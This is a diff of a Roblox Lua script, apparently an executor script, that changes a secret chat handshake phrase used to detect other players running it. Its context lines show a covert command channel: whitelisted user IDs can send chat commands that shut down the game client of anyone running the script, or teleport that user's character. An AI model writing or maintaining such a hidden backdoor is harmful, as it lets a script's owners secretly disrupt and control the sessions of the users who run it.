@@ -3,12 +3,12 @@ local possible = {}
 
 for index, asset in pairs(game:GetService("Players"):GetPlayers()) do
   if whitelistdata[tostring(asset.UserId)] and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
-      game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 64")
+      game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh meow")
   end
 end
 
 if whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
-  game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 64")
+  game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh meow")
 end
 
 game:GetService("TextChatService").OnIncomingMessage = function(msg)
@@ -19,7 +19,7 @@ game:GetService("TextChatService").OnIncomingMessage = function(msg)
   local prefix = msg.PrefixText
   local props = Instance.new("TextChatMessageProperties")
 
-  if Text:lower() == "-gh 64" then
+  if Text:lower() == "-gh meow" then
     if not whitelistdata[tostring(Player.UserId)] and not table.find(possible, Player) then
     table.insert(possible, Player)
     end
@@ -42,8 +42,8 @@ game:GetService("TextChatService").OnIncomingMessage = function(msg)
         game:Shutdown()
     elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-bring default" then
       game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame = Player.Character.Humanoid.RootPart.CFrame
-    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-gh 64" then
-      game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 64")
+    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-gh meow" then
+      game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh meow")
     end
   end
   return props
